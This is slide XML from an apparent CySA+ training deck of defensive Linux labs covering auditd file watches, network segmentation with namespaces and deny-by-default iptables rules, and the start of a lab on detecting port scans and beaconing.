          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Enable auditd and watch a sensitive file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>-w adds a watch, -p wa records writes and attribute changes, -k tags events with a key.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2585466"/>
            <a:ext cx="3977639" cy="5486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52360" y="2585466"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ systemctl enable --now auditd</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="21534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4064508"/>
            <a:ext cx="91440" cy="21534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005840" y="4912614"/>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4912614"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="5486400" cy="2153412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Apply a quick hardening control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Disable an unused service and verify:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4866894"/>
            <a:ext cx="3977639" cy="5486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52360" y="4866894"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ systemctl list-unit-files --state=enabled | head</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277</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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2 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Where Linux configuration, logs, and kernel tunables live.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to enumerate processes, sockets, hardware, and kernel.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to run a free CIS-style audit with lynis.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to write an auditd rule and read the resulting events with ausearch.</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278</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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3 — Network Segmentation and Zero Trust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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will build two isolated network "zones" using Linux network namespaces, then enforce a deny-by-default policy between them with iptables. This is a hands-on model of the segmentation, SDN, SASE, and Zero Trust concepts in CySA+ 1.1 (Network architecture, Segmentation, Zero trust).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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279</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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3 — Reference Diagram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g_7c675dab12.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2170891" y="1783080"/>
            <a:ext cx="7847169" cy="4434840"/>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280</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1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3 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Why segmentation?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A flat network lets ransomware pivot from any compromised host to every other.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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695651"/>
            <a:ext cx="91440" cy="78455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05840" y="285932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05840" y="2859328"/>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6" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Create two zones with network namespaces</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Two isolated network stacks now share a wire.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ ip netns add zone-a</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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240" y="3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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3" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Apply a deny-by-default policy in zone-b</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Re-test from zone-a:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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452360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ ip netns exec zone-b iptables -P INPUT DROP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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005840" y="468447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05840" y="4684470"/>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30" name="TextBox 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Allow only one explicit flow (Zero Trust style)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Permit only SSH (TCP/22) from zone-a, and only an established response:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Rectangle 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ ip netns exec zone-b iptables -A INPUT  -p tcp --dport 22 -s 10.10.1.1 -</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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777240" y="5433364"/>
            <a:ext cx="91440" cy="78455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1005840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: Map the model to CySA+ vocabulary</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 3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39" name="TextBox 3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0" name="TextBox 3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281</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1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3 — Hands-On Steps (cont'd)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4434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44348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05840" y="377190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3771900"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="4434840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Clean up</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726180"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726180"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ ip netns del zone-a</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282</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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3 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to build two isolated network zones with ip netns.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How iptables enforces a segmentation boundary.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How a deny-by-default + per-flow allow list maps to Zero Trust.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The CySA+ vocabulary (segmentation, SASE, SDN, ZTNA) in concrete commands.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283</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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4 — Detecting Malicious Network Activity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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will generate and detect several network-based indicators of compromise: port scans, beaconing, unusual traffic spikes, and activity on unexpected ports. These are exam-blueprint items under CySA+ 1.2 (Network-related indicators of malicious activity).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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284</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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1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4 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y tcpdump nmap netcat-openbsd curl</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Detect a port scan (scans/sweeps)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>In terminal 1, start a capture:</a:t>
            </a:r>
          </a:p>
